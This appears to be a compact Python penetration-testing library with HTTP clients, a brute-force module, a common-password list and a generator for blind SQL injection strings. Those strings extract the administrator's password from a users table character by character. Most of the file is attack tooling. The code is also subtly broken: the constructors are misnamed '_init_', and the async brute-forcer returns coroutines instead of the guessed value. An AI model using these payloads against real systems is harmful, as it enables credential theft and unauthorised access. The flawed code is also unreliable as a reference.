from .http_requests import HTTPClient, AsyncHTTPClient
from .bruteforce import BruteForce
from .payloads import PayloadGenerator
from .response_analysis import ResponseAnalyzer

# /pentestlib/http_requests.py
import requests
import aiohttp
import asyncio

class HTTPClient:
    def _init_(self, base_url, headers=None, cookies=None):
        self.base_url = base_url
        self.headers = headers or {}
        self.cookies = cookies or {}

    def get(self, path='', params=None):
        return requests.get(self.base_url + path, headers=self.headers, cookies=self.cookies, params=params)

    def post(self, path='', data=None, json=None):
        return requests.post(self.base_url + path, headers=self.headers, cookies=self.cookies, data=data, json=json)

class AsyncHTTPClient:
    def _init_(self, base_url, headers=None, cookies=None):
        self.base_url = base_url
        self.headers = headers or {}
        self.cookies = cookies or {}

    async def get(self, path='', params=None):
        async with aiohttp.ClientSession(headers=self.headers, cookies=self.cookies) as session:
            async with session.get(self.base_url + path, params=params) as response:
                return await response.text()

    async def post(self, path='', data=None, json=None):
        async with aiohttp.ClientSession(headers=self.headers, cookies=self.cookies) as session:
            async with session.post(self.base_url + path, data=data, json=json) as response:
                return await response.text()

# /pentestlib/bruteforce.py
import asyncio

class BruteForce:
    def _init_(self, http_client, async_http_client=None):
        self.http_client = http_client
        self.async_http_client = async_http_client

    def brute_force_sync(self, target_func, character_set, max_length):
        for length in range(1, max_length + 1):
            for attempt in self._generate_attempts(character_set, length):
                if target_func(attempt):
                    return attempt
        return None

    async def brute_force_async(self, target_func, character_set, max_length):
        tasks = []
        for length in range(1, max_length + 1):
            for attempt in self._generate_attempts(character_set, length):
                tasks.append(target_func(attempt))
        results = await asyncio.gather(*tasks)
        return next((attempt for attempt, success in zip(tasks, results) if success), None)

    def _generate_attempts(self, character_set, length):
        if length == 1:
            return character_set
        smaller_attempts = self._generate_attempts(character_set, length - 1)
        return [attempt + char for attempt in smaller_attempts for char in character_set]

# /pentestlib/payloads.py
class PayloadGenerator:
    @staticmethod
    def sql_injection_payload(base_query, position, character):
        return f"{base_query}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{position},1)='{character}'--"

    @staticmethod
    def common_passwords():
        return ['password', '123456', 'admin', 'welcome']

# /pentestlib/response_analysis.py
class ResponseAnalyzer:
    @staticmethod
    def is_success(response_text, success_indicator):
        return success_indicator in response_text
